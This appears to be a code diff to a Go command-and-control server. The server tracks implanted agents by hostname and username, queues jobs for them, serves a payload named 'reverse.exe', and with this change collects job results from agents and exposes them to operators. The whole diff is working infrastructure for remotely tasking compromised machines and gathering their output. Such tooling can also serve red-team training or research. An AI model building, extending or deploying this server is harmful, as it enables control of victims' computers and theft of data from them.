@@ -21,6 +21,8 @@ type C2Server struct {
 	operatorPasswordHash string
 	activeAgents         []Agent
 	jobs                 map[string][]string
+	jobsStatuses         map[string]bool
+	jobsResults          map[string]string
 	payloads             map[string]string
 }
 
@@ -76,6 +78,8 @@ func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
 	c2s.r = r
 	c2s.jobs = make(map[string][]string)
 	c2s.payloads = make(map[string]string)
+	c2s.jobsStatuses = make(map[string]bool)
+	c2s.jobsResults = make(map[string]string)
 	c2s.payloads["cccccccccccccccc"] = "reverse.exe"
 	return &c2s, nil
 }
@@ -99,6 +103,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	{
 		agent.GET("/jobs", c2s.jobsHandler)
 		agent.GET("/payload/:job-uuid", c2s.payloadHandler)
+		agent.POST("/jobs/update", c2s.updateJobStatusHandler)
 	}
 
 	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
@@ -113,7 +118,9 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	operator.Use(authOperatorMiddleware.MiddlewareFunc())
 	{
 		operator.GET("/agents/", c2s.agentsHandler)
-		operator.POST("/agent/job/add", c2s.addJobHandler)
+		operator.POST("/agents/job/add", c2s.addJobHandler)
+		operator.GET("/agents/:agent-uuid/jobs", c2s.getAllAgentJobsHandler)
+		operator.GET("/agents/:agent-uuid/jobs/:job-uuid/status", c2s.getJobStatusHandler)
 	}
 	return r, nil
 }
@@ -158,6 +165,11 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 					Uuid:     uuid,
 					Hostname: hostname,
 					Username: username,
+				}
+				for _, agent := range c2s.activeAgents {
+					if agent.Uuid == newAgent.Uuid {
+						return nil, fmt.Errorf("Agent with this uuid already connected: %s", newAgent.Uuid)
+					}
 				}
 				c2s.activeAgents = append(c2s.activeAgents, newAgent)
 				return &newAgent, nil
@@ -208,6 +220,31 @@ func (c2s *C2Server) payloadHandler(c *gin.Context) {
 	c.Header("Content-Disposition", "attachment; filename="+payloadFilename)
 	c.Header("Content-Type", "application/octet-stream")
 	c.File(payloadPath)
+}
+
+func (c2s *C2Server) updateJobStatusHandler(c *gin.Context) {
+	receivedAgent, _ := c.Get(c2s.agentIdentityKey)
+	agentFound := false
+	for _, agent := range c2s.activeAgents {
+		if agent.Uuid == receivedAgent.(*Agent).Uuid {
+			agentFound = true
+			break
+		}
+	}
+	if agentFound {
+		var updateJobStatusRequest struct {
+			JobUuid   string `json:"job-uuid"`
+			Status    bool   `json:"status"`
+			JobResult string `json:"job-result"`
+		}
+		if c.Bind(&updateJobStatusRequest) == nil {
+			c2s.jobsStatuses[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.Status
+			c2s.jobsResults[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.JobResult
+			c.JSON(200, gin.H{"status": "ok"})
+		}
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
 }
 
 func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
@@ -282,14 +319,81 @@ func (c2s *C2Server) addJobHandler(c *gin.Context) {
 		AgentUuid string `json:"agent-uuid" binding:"required"`
 		JobUuid   string `json:"job-uuid" binding:"required"`
 	}
+	agentFound := false
 	if c.Bind(&addJobRequest) == nil {
-		if len(c2s.jobs[addJobRequest.AgentUuid]) == 0 {
-			c2s.jobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
+		for _, agent := range c2s.activeAgents {
+			if addJobRequest.AgentUuid == agent.Uuid {
+				agentFound = true
+			}
+		}
+		if agentFound {
+			if len(c2s.jobs[addJobRequest.AgentUuid]) == 0 {
+				c2s.jobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
+			} else {
+				c2s.jobs[addJobRequest.AgentUuid] = append(c2s.jobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
+			}
+			c2s.jobsStatuses[addJobRequest.JobUuid] = false
+			c2s.jobsResults[addJobRequest.JobUuid] = ""
+			c.JSON(200, gin.H{"status": "ok"})
 		} else {
-			c2s.jobs[addJobRequest.AgentUuid] = append(c2s.jobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
+			c.JSON(404, gin.H{"status": "agent not found"})
 		}
 	}
-	c.JSON(200, gin.H{"status": "ok"})
+}
+
+func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
+	agentUuid := c.Param("agent-uuid")
+	agentFound := false
+	for _, agent := range c2s.activeAgents {
+		if agentUuid == agent.Uuid {
+			agentFound = true
+		}
+	}
+	if agentFound {
+		var agentJobsStatus struct {
+			AgentUuid string `json:"agent-uuid"`
+			AgentJobs struct {
+				Job    string `json:"job-uuid"`
+				Status bool   `json:"status"`
+				Result string `json:"job-result"`
+			} `json:"agent-jobs"`
+		}
+		for _, jobUuid := range c2s.jobs[agentUuid] {
+			agentJobsStatus.AgentUuid = agentUuid
+			agentJobsStatus.AgentJobs.Job = jobUuid
+			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
+			agentJobsStatus.AgentJobs.Result = c2s.jobsResults[jobUuid]
+		}
+		c.JSON(200, &agentJobsStatus)
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
+}
+
+func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
+	agentUuid := c.Param("agent-uuid")
+	jobUuid := c.Param("job-uuid")
+	agentFound := false
+	for _, agent := range c2s.activeAgents {
+		if agentUuid == agent.Uuid {
+			agentFound = true
+		}
+	}
+	if agentFound {
+		jobFound := false
+		for _, job := range c2s.jobs[agentUuid] {
+			if jobUuid == job {
+				jobFound = true
+			}
+		}
+		if jobFound {
+			c.JSON(200, gin.H{"status": c2s.jobsStatuses[jobUuid], "job-result": c2s.jobsResults[jobUuid]})
+		} else {
+			c.JSON(404, gin.H{"status": "job not found"})
+		}
+	} else {
+		c.JSON(404, gin.H{"status": "agent not found"})
+	}
 }
 
 func (c2s *C2Server) Run() error {
